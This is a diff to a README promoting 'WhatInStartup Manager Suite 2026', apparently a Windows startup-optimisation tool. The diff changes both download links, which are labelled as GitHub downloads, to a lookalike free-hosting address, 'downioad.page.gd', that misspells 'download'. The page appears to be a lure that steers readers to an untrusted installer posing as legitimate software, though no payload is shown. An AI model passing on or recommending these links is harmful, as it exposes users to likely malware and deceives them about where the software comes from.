@@ -2,7 +2,7 @@
 
 WhatInStartup Manager Suite 2026 is a powerful Windows utility designed to help users efficiently manage and optimize their startup programs. By providing detailed control over startup entries, it enables faster boot times, reduces system clutter, and improves overall performance on Windows 10 and Windows 11 systems. This tool is ideal for both casual users and IT professionals seeking a streamlined way to enhance computer efficiency.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Why Use WhatInStartup?
 
@@ -62,7 +62,7 @@ A4: Updates can be checked via the Help menu within the application. For support
 
 For the most recent version of WhatInStartup Manager Suite 2026, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Last Updated: 2026  
 © 2026 WhatInStartup Development Team. All rights reserved.
